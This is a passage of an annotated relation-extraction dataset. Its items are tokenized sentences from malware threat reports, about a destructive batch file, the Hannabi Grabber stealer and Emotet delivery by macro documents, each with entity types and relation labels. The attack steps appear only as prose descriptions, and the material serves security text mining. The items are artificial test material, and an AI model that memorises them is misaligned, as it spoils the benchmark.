"vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [8, 8], "name": "final payload", "pos": [8, 10], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [12, 12], "name": "IPFS", "pos": [12, 13], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [15, 15], "name": "Windows batch file", "pos": [15, 18], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [23, 23], "name": "batch file", "pos": [4, 6], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [33, 33], "name": "Script.bat", "pos": [14, 15], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [36, 36], "name": "It", "pos": [0, 1], "index": "5_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [38, 38], "name": "volume shadow copies", "pos": [2, 5], "index": "6_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [46, 46], "name": "C : \\Users", "pos": [10, 13], "index": "7_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [62, 62], "name": "mounted filesystems", "pos": [26, 28], "index": "8_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [67, 67], "name": "system", "pos": [31, 32], "index": "9_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [84, 84], "name": "loader", "pos": [1, 2], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [94, 94], "name": "Hannabi Grabber", "pos": [11, 13], "index": "11_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [104, 104], "name": "It", "pos": [0, 1], "index": "12_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [106, 106], "name": "Discord Webhooks", "pos": [2, 4], "index": "13_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [109, 109], "name": "C2", "pos": [5, 6], "index": "14_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [121, 121], "name": "IPInfo service", "pos": [17, 19], "index": "15_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [135, 135], "name": "Discord server", "pos": [31, 33], "index": "16_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [142, 142], "name": "malware", "pos": [4, 5], "index": "17_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [144, 144], "name": "Chrome", "pos": [6, 7], "index": "18_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [152, 152], "name": "Mozilla Firefox", "pos": [14, 16], "index": "19_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [156, 156], "name": "Discord", "pos": [0, 1], "index": "20_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [158, 158], "name": "Roblox", "pos": [2, 3], "index": "21_0"}]], "labels": [{"r": "CO", "evidence": [0], "h": 0, "t": 2}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 3}, {"r": "ST", "evidence": [0, 1], "t": 1, "h": 4}, {"r": "RD", "evidence": [1, 2], "h": 4, "t": 6}, {"r": "RF", "evidence": [0, 1], "t": 1, "h": 4}, {"r": "RD", "evidence": [1, 2], "h": 4, "t": 7}, {"r": "RD", "evidence": [1, 2], "h": 4, "t": 8}, {"r": "CO", "evidence": [1, 2], "h": 4, "t": 5}, {"r": "WR", "evidence": [2], "h": 5, "t": 6}, {"r": "WR", "evidence": [2], "h": 5, "t": 7}, {"r": "WR", "evidence": [2], "h": 5, "t": 8}, {"r": "CO", "evidence": [2], "h": 8, "t": 9}, {"r": "FR", "evidence": [4], "h": 10, "t": 11}, {"r": "CO", "evidence": [4, 5], "h": 11, "t": 12}, {"r": "FR", "evidence": [5], "h": 12, "t": 13}, {"r": "ST", "evidence": [5], "h": 13, "t": 14}, {"r": "RF", "evidence": [5], "h": 13, "t": 14}, {"r": "IJ", "evidence": [5], "h": 12, "t": 15}, {"r": "ST", "evidence": [5], "h": 12, "t": 16}, {"r": "RF", "evidence": [5], "h": 12, "t": 16}, {"r": "RD", "evidence": [6], "h": 17, "t": 18}, {"r": "RD", "evidence": [6], "h": 17, "t": 18}, {"r": "WR", "evidence": [6], "h": 17, "t": 18}, {"r": "RD", "evidence": [6], "h": 17, "t": 19}, {"r": "RD", "evidence": [6], "h": 17, "t": 19}, {"r": "WR", "evidence": [6], "h": 17, "t": 19}, {"r": "RD", "evidence": [6, 7], "h": 17, "t": 20}, {"r": "RD", "evidence": [6, 7], "h": 17, "t": 20}, {"r": "WR", "evidence": [6, 7], "h": 17, "t": 20}, {"r": "RD", "evidence": [6, 7], "h": 17, "t": 21}, {"r": "RD", "evidence": [6, 7], "h": 17, "t": 21}, {"r": "WR", "evidence": [6, 7], "h": 17, "t": 21}]}, {"title": "002-21", "sents": [["When", "retrieved", ",", "the", "batch", "file", "was", "saved", "in", "the", "Network", "directory", "as", "``", "Script.bat", "''", "."], ["It", "deleted", "volume", "shadow", "copies", ",", "cleared", "the", "contents", "of", "C", ":", "\\Users", "(", "associated", "with", "user", "profiles", ")", ",", "and", "eliminated", "contents", "stored", "on", "all", "mounted", "filesystems", "detected", "on", "the", "system", "."], ["The", "malware", "incorrectly", "tried", "to", "invoke", "the", "batch", "file", "in", "the", "analyzed", "samples", "."], ["The", "loader", "'s", "third", "cluster", "was", "tasked", "with", "retrieving", "and", "executing", "Hannabi", "Grabber", ",", "an", "information", "stealer", "written", "in", "Python", "."], ["It", "uses", "Discord", "Webhooks", "for", "C2", "and", "data", "exfiltration", ",", "collects", "survey", "data", ",", "geographic", "location", "via", "IPInfo", "service", ",", "takes", "screenshots", ",", "and", "sends", "JSON", "formatted", "data", "to", "an", "attacker-controlled", "Discord", "server", "."], ["In", "addition", ",", "the", "malware", "targets", "Chrome", "passwords", "and", "cookies", ",", "as", "well", "as", "Mozilla", "Firefox", "data", "."], ["Discord", "and", "Roblox", "data", "are", "of", "particular", "interest", "to", "the", "information", "stealer", "."], ["The", "collected", "application", "data", "is", "stored", "in", "a", "RedDiscord", "folder", "with", "a", "ZIP", "archive", "called", "``", "Hannabi-", "<", "USERNAME", ">", ".zip", "''", "created", "within", "it", "before", "being", "exfiltrated", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [4, 4], "name": "batch file", "pos": [4, 6], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [14, 14], "name": "Script.bat", "pos": [14, 15], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [17, 17], "name": "It", "pos": [0, 1], "index": "2_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [19, 19], "name": "volume shadow copies", "pos": [2, 5], "index": "3_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [27, 27], "name": "C : \\Users", "pos": [10, 13], "index": "4_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [43, 43], "name": "mounted filesystems", "pos": [26, 28], "index": "5_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [48, 48], "name": "system", "pos": [31, 32], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [65, 65], "name": "loader", "pos": [1, 2], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [75, 75], "name": "Hannabi Grabber", "pos": [11, 13], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [85, 85], "name": "It", "pos": [0, 1], "index": "9_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [87, 87], "name": "Discord Webhooks", "pos": [2, 4], "index": "10_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [90, 90], "name": "C2", "pos": [5, 6], "index": "11_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [102, 102], "name": "IPInfo service", "pos": [17, 19], "index": "12_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [116, 116], "name": "Discord server", "pos": [31, 33], "index": "13_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [123, 123], "name": "malware", "pos": [4, 5], "index": "14_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [125, 125], "name": "Chrome", "pos": [6, 7], "index": "15_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [133, 133], "name": "Mozilla Firefox", "pos": [14, 16], "index": "16_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [137, 137], "name": "Discord", "pos": [0, 1], "index": "17_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [139, 139], "name": "Roblox", "pos": [2, 3], "index": "18_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [152, 152], "name": "application data", "pos": [2, 4], "index": "19_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [158, 158], "name": "RedDiscord", "pos": [8, 9], "index": "20_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [162, 162], "name": "ZIP archive", "pos": [12, 14], "index": "21_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [166, 166], "name": "Hannabi- < USERNAME > .zip", "pos": [16, 21], "index": "22_0"}]], "labels": [{"r": "RD", "evidence": [0, 1], "h": 1, "t": 3}, {"r": "RD", "evidence": [0, 1], "h": 1, "t": 4}, {"r": "RD", "evidence": [0, 1], "h": 1, "t": 5}, {"r": "CO", "evidence": [0, 1], "h": 1, "t": 2}, {"r": "WR", "evidence": [1], "h": 2, "t": 3}, {"r": "WR", "evidence": [1], "h": 2, "t": 4}, {"r": "WR", "evidence": [1], "h": 2, "t": 5}, {"r": "CO", "evidence": [1], "h": 5, "t": 6}, {"r": "FR", "evidence": [3], "h": 7, "t": 8}, {"r": "CO", "evidence": [3, 4], "h": 8, "t": 9}, {"r": "FR", "evidence": [4], "h": 9, "t": 10}, {"r": "ST", "evidence": [4], "h": 10, "t": 11}, {"r": "RF", "evidence": [4], "h": 10, "t": 11}, {"r": "IJ", "evidence": [4], "h": 9, "t": 12}, {"r": "ST", "evidence": [4], "h": 9, "t": 13}, {"r": "RF", "evidence": [4], "h": 9, "t": 13}, {"r": "RD", "evidence": [5], "h": 14, "t": 15}, {"r": "RD", "evidence": [5], "h": 14, "t": 15}, {"r": "WR", "evidence": [5], "h": 14, "t": 15}, {"r": "RD", "evidence": [5], "h": 14, "t": 16}, {"r": "RD", "evidence": [5], "h": 14, "t": 16}, {"r": "WR", "evidence": [5], "h": 14, "t": 16}, {"r": "RD", "evidence": [5, 6], "h": 14, "t": 17}, {"r": "RD", "evidence": [5, 6], "h": 14, "t": 17}, {"r": "WR", "evidence": [5, 6], "h": 14, "t": 17}, {"r": "RD", "evidence": [5, 6], "h": 14, "t": 18}, {"r": "RD", "evidence": [5, 6], "h": 14, "t": 18}, {"r": "WR", "evidence": [5, 6], "h": 14, "t": 18}, {"r": "CO", "evidence": [7], "h": 21, "t": 22}, {"r": "CO", "evidence": [7], "h": 19, "t": 20}]}, {"title": "002-22", "sents": [["It", "deleted", "volume", "shadow", "copies", ",", "cleared", "the", "contents", "of", "C", ":", "\\Users", "(", "associated", "with", "user", "profiles", ")", ",", "and", "eliminated", "contents", "stored", "on", "all", "mounted", "filesystems", "detected", "on", "the", "system", "."], ["The", "malware", "incorrectly", "tried", "to", "invoke", "the", "batch", "file", "in", "the", "analyzed", "samples", "."], ["The", "loader", "'s", "third", "cluster", "was", "tasked", "with", "retrieving", "and", "executing", "Hannabi", "Grabber", ",", "an", "information", "stealer", "written", "in", "Python", "."], ["It", "uses", "Discord", "Webhooks", "for", "C2", "and", "data", "exfiltration", ",", "collects", "survey", "data", ",", "geographic", "location", "via", "IPInfo", "service", ",", "takes", "screenshots", ",", "and", "sends", "JSON", "formatted", "data", "to", "an", "attacker-controlled", "Discord", "server", "."], ["In", "addition", ",", "the", "malware", "targets", "Chrome", "passwords", "and", "cookies", ",", "as", "well", "as", "Mozilla", "Firefox", "data", "."], ["Discord", "and", "Roblox", "data", "are", "of", "particular", "interest", "to", "the", "information", "stealer", "."], ["The", "collected", "application", "data", "is", "stored", "in", "a", "RedDiscord", "folder", "with", "a", "ZIP", "archive", "called", "``", "Hannabi-", "<", "USERNAME", ">", ".zip", "''", "created", "within", "it", "before", "being", "exfiltrated", "."], ["Unlike", "other", "attackers", "who", "tend", "to", "compile", "their", "Python", "into", "a", "PE32", "file", "format", "using", "PyInstaller", "or", "Py2EXE", "prior", "to", "distribution", "to", "victims", ",", "this", "attacker", "opted", "to", "include", "a", "Python", "installation", "process", "during", "the", "infection", "and", "employs", "Python", "directly", "to", "steal", "sensitive", "information", "from", "victims", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "It", "pos": [0, 1], "index": "0_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [2, 2], "name": "volume shadow copies", "pos": [2, 5], "index": "1_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [10, 10], "name": "C : \\Users", "pos": [10, 13], "index": "2_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [26, 26], "name": "mounted filesystems", "pos": [26, 28], "index": "3_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [31, 31], "name": "system", "pos": [31, 32], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [48, 48], "name": "loader", "pos": [1, 2], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [58, 58], "name": "Hannabi Grabber", "pos": [11, 13], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [68, 68], "name": "It", "pos": [0, 1], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [70, 70], "name": "Discord Webhooks", "pos": [2, 4], "index": "8_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [73, 73], "name": "C2", "pos": [5, 6], "index": "9_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [85, 85], "name": "IPInfo service", "pos": [17, 19], "index": "10_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [99, 99], "name": "Discord server", "pos": [31, 33], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [106, 106], "name": "malware", "pos": [4, 5], "index": "12_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [108, 108], "name": "Chrome", "pos": [6, 7], "index": "13_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [116, 116], "name": "Mozilla Firefox", "pos": [14, 16], "index": "14_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [120, 120], "name": "Discord", "pos": [0, 1], "index": "15_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [122, 122], "name": "Roblox", "pos": [2, 3], "index": "16_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [135, 135], "name": "application data", "pos": [2, 4], "index": "17_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [141, 141], "name": "RedDiscord", "pos": [8, 9], "index": "18_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [145, 145], "name": "ZIP archive", "pos": [12, 14], "index": "19_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [149, 149], "name": "Hannabi- < USERNAME > .zip", "pos": [16, 21], "index": "20_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [164, 164], "name": "attackers", "pos": [2, 3], "index": "21_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [170, 170], "name": "Python", "pos": [8, 9], "index": "22_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [173, 173], "name": "PE32 file", "pos": [11, 13], "index": "23_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [177, 177], "name": "PyInstaller", "pos": [15, 16], "index": "24_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [179, 179], "name": "Py2EXE", "pos": [17, 18], "index": "25_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [187, 187], "name": "attacker", "pos": [25, 26], "index": "26_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [192, 192], "name": "Python installation", "pos": [30, 32], "index": "27_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [200, 200], "name": "Python", "pos": [38, 39], "index": "28_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [204, 204], "name": "sensitive information", "pos": [42, 44], "index": "29_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 2}, {"r": "WR", "evidence": [0], "h": 0, "t": 3}, {"r": "CO", "evidence": [0], "h": 3, "t": 4}, {"r": "FR", "evidence": [2], "h": 5, "t": 6}, {"r": "CO", "evidence": [2, 3], "h": 6, "t": 7}, {"r": "FR", "evidence": [3], "h": 7, "t": 8}, {"r": "ST", "evidence": [3], "h": 8, "t": 9}, {"r": "RF", "evidence": [3], "h": 8, "t": 9}, {"r": "IJ", "evidence": [3], "h": 7, "t": 10}, {"r": "ST", "evidence": [3], "h": 7, "t": 11}, {"r": "RF", "evidence": [3], "h": 7, "t": 11}, {"r": "RD", "evidence": [4], "h": 12, "t": 13}, {"r": "RD", "evidence": [4], "h": 12, "t": 13}, {"r": "WR", "evidence": [4], "h": 12, "t": 13}, {"r": "RD", "evidence": [4], "h": 12, "t": 14}, {"r": "RD", "evidence": [4], "h": 12, "t": 14}, {"r": "WR", "evidence": [4], "h": 12, "t": 14}, {"r": "RD", "evidence": [4, 5], "h": 12, "t": 15}, {"r": "RD", "evidence": [4, 5], "h": 12, "t": 15}, {"r": "WR", "evidence": [4, 5], "h": 12, "t": 15}, {"r": "RD", "evidence": [4, 5], "h": 12, "t": 16}, {"r": "RD", "evidence": [4, 5], "h": 12, "t": 16}, {"r": "WR", "evidence": [4, 5], "h": 12, "t": 16}, {"r": "CO", "evidence": [6], "h": 19, "t": 20}, {"r": "CO", "evidence": [6], "h": 17, "t": 18}, {"r": "FR", "evidence": [7], "h": 21, "t": 24}, {"r": "RD", "evidence": [7], "t": 22, "h": 24}, {"r": "WR", "evidence": [7], "t": 23, "h": 24}, {"r": "FR", "evidence": [7], "h": 21, "t": 25}, {"r": "RD", "evidence": [7], "t": 22, "h": 25}, {"r": "WR", "evidence": [7], "t": 23, "h": 25}, {"r": "FR", "evidence": [7], "h": 26, "t": 28}, {"r": "WR", "evidence": [7], "h": 26, "t": 29}, {"r": "CO", "evidence": [7], "h": 21, "t": 26}]}, {"title": "037-0", "sents": [["We", "observed", "several", "Trickbot", "C2", "servers", "issuing", "this", "command", "to", "Trickbot", "infections", "associated", "with", "a", "variety", "of", "different", "gtags", "."], ["Subsequently", ",", "new", "malicious", "email", "campaigns", "were", "observed", "delivering", "Emotet", "to", "victims", "directly", "."], ["Below", "is", "an", "example", "of", "a", "message", "sent", "via", "email", "thread", "hijacking", "."], ["These", "emails", "typically", "contain", "an", "attached", "file", "that", "functions", "as", "a", "downloader", "to", "retrieve", "the", "Emotet", "payload", "."], ["Emotet", "has", "been", "observed", "leveraging", "DOCM", ",", "XLSM", ",", "and", "password-protected", "ZIP", "archives", "across", "these", "spam", "campaigns", "."], ["Below", "is", "an", "example", "of", "one", "of", "the", "XLSM", "files", "observed", "being", "delivered", "in", "these", "malspam", "campaigns", "."], ["These", "documents", "contain", "OLE2", "macros", "."], ["When", "executed", ",", "WScript", "is", "used", "to", "invoke", "PowerShell", "which", "is", "used", "to", "retrieve", "the", "Emotet", "DLL", "from", "attacker-controlled", "distribution", "servers", "."]], "vertexSet": [[{"type": "SO", "sent_id": 0, "global_pos": [3, 3], "name": "Trickbot C2 servers", "pos": [3, 6], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [10, 10], "name": "Trickbot", "pos": [10, 11], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [24, 24], "name": "email campaigns", "pos": [4, 6], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [29, 29], "name": "Emotet", "pos": [9, 10], "index": "3_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [31, 31], "name": "victims", "pos": [11, 12], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [40, 40], "name": "message", "pos": [6, 7], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [43, 43], "name": "email thread hijacking", "pos": [9, 12], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [48, 48], "name": "emails", "pos": [1, 2], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [52, 52], "name": "attached file", "pos": [5, 7], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [58, 58], "name": "downloader", "pos": [11, 12], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [62, 62], "name": "Emotet payload", "pos": [15, 17], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [65, 65], "name": "Emotet", "pos": [0, 1], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [70, 70], "name": "DOCM", "pos": [5, 6], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [72, 72], "name": "XLSM", "pos": [7, 8], "index": "13_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [75, 75], "name": "password-protected ZIP", "pos": [10, 12], "index": "14_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [80, 80], "name": "spam campaigns", "pos": [15, 17], "index": "15_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [91, 91], "name": "XLSM files", "pos": [8, 10], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [98, 98], "name": "malspam campaigns", "pos": [15, 17], "index": "17_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [102, 102], "name": "documents", "pos": [1, 2], "index": "18_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [104, 104], "name": "OLE2 macros", "pos": [3, 5], "index": "19_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [110, 110], "name": "WScript", "pos": [3, 4], "index": "20_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [115, 115], "name": "PowerShell", "pos": [8, 9], "index": "21_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [122, 122], "name": "Emotet DLL", "pos": [15, 17], "index": "22_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [126, 126], "name": "distribution servers", "pos": [19, 21], "index": "23_0"}]], "labels": [{"r": "ST", "evidence": [0], "t": 0, "h": 1}, {"r": "RF", "evidence": [0], "t": 0, "h": 1}, {"r": "WR", "evidence": [1], "h": 2, "t": 3}, {"r": "ST", "evidence": [1], "h": 2, "t": 4}, {"r": "WR", "evidence": [1, 2], "h": 2, "t": 5}, {"r": "WR", "evidence": [2], "t": 5, "h": 6}, {"r": "CO", "evidence": [2, 3], "h": 6, "t": 7}, {"r": "WR", "evidence": [3], "h": 7, "t": 8}, {"r": "EX", "evidence": [3], "t": 8, "h": 9}, {"r": "WR", "evidence": [3], "h": 9, "t": 10}, {"r": "EX", "evidence": [3, 4], "t": 10, "h": 11}, {"r": "WR", "evidence": [4], "h": 11, "t": 12}, {"r": "WR", "evidence": [4], "h": 11, "t": 13}, {"r": "WR", "evidence": [4], "h": 11, "t": 14}, {"r": "RD", "evidence": [4], "t": 14, "h": 15}, {"r": "CO", "evidence": [4, 5], "h": 13, "t": 16}, {"r": "CO", "evidence": [4, 5], "h": 15, "t": 17}, {"r": "WR", "evidence": [6], "h": 18, "t": 19}, {"r": "FR", "evidence": [7], "h": 20, "t": 21}, {"r": "WR", "evidence": [7], "h": 21, "t": 22}, {"r": "ST", "evidence": [7], "h": 21, "t": 23}, {"r": "RF", "evidence": [7], "h": 21, "t": 23}]}, {"title": "037-1", "sents": [["Subsequently", ",", "new", "malicious", "email", "campaigns", "were", "observed", "delivering", "Emotet", "to", "victims", "directly", "."], ["Below", "is", "an", "example", "of", "a", "message", "sent", "via", "email", "thread", "hijacking", "."], ["These", "emails", "typically", "contain", "an", "attached", "file", "that", "functions", "as", "a", "downloader", "to", "retrieve", "the", "Emotet", "payload", "."], ["Emotet", "has", "been", "observed", "leveraging", "DOCM", ",", "XLSM", ",", "and", "password-protected", "ZIP", "archives", "across", "these", "spam", "campaigns", "."], ["Below", "is", "an", "example", "of", "one", "of", "the", "XLSM", "files", "observed", "being", "delivered", "in", "these", "malspam", "campaigns", "."], ["These", "documents", "contain", "OLE2", "macros", "."], ["When", "executed", ",", "WScript", "is", "used", "to", "invoke", "PowerShell", "which", "is", "used", "to", "retrieve", "the", "Emotet", "DLL", "from", "attacker-controlled", "distribution", "servers", "."], ["The", "macros", "are", "obfuscated", ",", "but", "the", "screenshot", "below", "shows", "the", "PowerShell", "invocation", "once", "deobfuscated", "at", "runtime", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [4, 4], "name": "email campaigns", "pos": [4, 6], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [9, 9], "name": "Emotet", "pos": [9, 10], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [11, 11], "name": "victims", "pos": [11, 12], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [20, 20], "name": "message", "pos": [6, 7], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [23, 23], "name": "email thread hijacking", "pos": [9, 12], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [28, 28], "name": "emails", "pos": [1, 2], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [32, 32], "name": "attached file", "pos": [5, 7], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [38, 38], "name": "downloader", "pos": [11, 12], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [42, 42], "name": "Emotet payload", "pos": [15, 17], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [45, 45], "name": "Emotet", "pos": [0, 1], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [50, 50], "name": "DOCM", "pos": [5, 6], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [52, 52], "name": "XLSM", "pos": [7, 8], "index": "11_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [55, 55], "name": "password-protected ZIP", "pos": [10, 12], "index": "12_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [60, 60], "name": "spam campaigns", "pos": [15, 17], "index": "13_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [71, 71], "name": "XLSM files", "pos": [8, 10], "index": "14_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [78, 78], "name": "malspam campaigns", "pos": [15, 17], "index": "15_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [82, 82], "name": "documents", "pos": [1, 2], "index": "16_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [84, 84], "name": "OLE2 macros", "pos": [3, 5], "index": "17_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [90, 90], "name": "WScript", "pos": [3, 4], "index": "18_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [95, 95], "name": "PowerShell", "pos": [8, 9], "index": "19_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [102, 102], "name": "Emotet DLL", "pos": [15, 17], "index": "20_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [106, 106], "name": "distribution servers", "pos": [19, 21], "index": "21_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [110, 110], "name": "macros", "pos": [1, 2], "index": "22_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [120, 120], "name": "PowerShell", "pos": [11, 12], "index": "23_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "ST", "evidence": [0], "h": 0, "t": 2}, {"r": "WR", "evidence": [0, 1], "h": 0, "t": 3}, {"r": "WR", "evidence": [1], "t": 3, "h": 4}, {"r": "CO", "evidence": [1, 2], "h": 4, "t": 5}, {"r": "WR", "evidence": [2], "h": 5, "t": 6}, {"r": "EX", "evidence": [2], "t": 6, "h": 7}, {"r": "WR", "evidence": [2], "h": 7, "t": 8}, {"r": "EX", "evidence": [2, 3], "t": 8, "h": 9}, {"r": "WR", "evidence": [3], "h": 9, "t": 10}, {"r": "WR", "evidence": [3], "h": 9, "t": 11}, {"r": "WR", "evidence": [3], "h": 9, "t": 12}, {"r": "RD", "evidence": [3], "t": 12, "h": 13}, {"r": "CO", "evidence": [3, 4], "h": 11, "t": 14}, {"r": "CO", "evidence": [3, 4], "h": 13, "t": 15}, {"r": "WR", "evidence": [5], "h": 16, "t": 17}, {"r": "CO", "evidence": [5, 6, 7], "h": 17, "t": 22}, {"r": "FR", "evidence": [6], "h": 18, "t": 19}, {"r": "WR", "evidence": [6], "h": 19, "t": 20}, {"r": "ST", "evidence": [6], "h": 19, "t": 21}, {"r": "RF", "evidence": [6], "h": 19, "t": 21}, {"r": "RD", "evidence": [6, 7], "t": 20, "h": 23}, {"r": "EX", "evidence": [6, 7], "t": 20, "h": 23}]}, {"title": "037-2", "sents": [["Below", "is", "an", "example", "of", "a", "message", "sent", "via", "email", "thread", "hijacking", "."], ["These", "emails", "typically", "contain", "an", "attached", "file", "that", "functions", "as", "a", "downloader", "to", "retrieve", "the", "Emotet", "payload", "."], ["Emotet", "has", "been", "observed", "leveraging", "DOCM", ",", "XLSM", ",", "and", "password-protected", "ZIP", "archives", "across", "these", "spam", "campaigns", "."], ["Below", "is", "an", "example", "of", "one", "of", "the", "XLSM", "files", "observed", "being", "delivered", "in", "these", "malspam", "campaigns", "."], ["These", "documents", "contain", "OLE2", "macros", "."], ["When", "executed", ",", "WScript", "is", "used", "to", "invoke", "PowerShell", "which", "is", "used", "to", "retrieve", "the", "Emotet", "DLL", "from", "attacker-controlled", "distribution", "servers", "."], ["The", "macros", "are", "obfuscated", ",", "but", "the", "screenshot", "below", "shows", "the", "PowerShell", "invocation", "once", "deobfuscated", "at", "runtime", "."], ["The", "DLL", "is", "then", "executed", "via", "rundll32.exe", ",", "thus", "infecting", "the", "system", "with", "Emotet", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [6, 6], "name": "message", "pos": [6, 7], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [9, 9], "name": "email thread hijacking", "pos": [9, 12], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [14, 14], "name": "emails", "pos": [1, 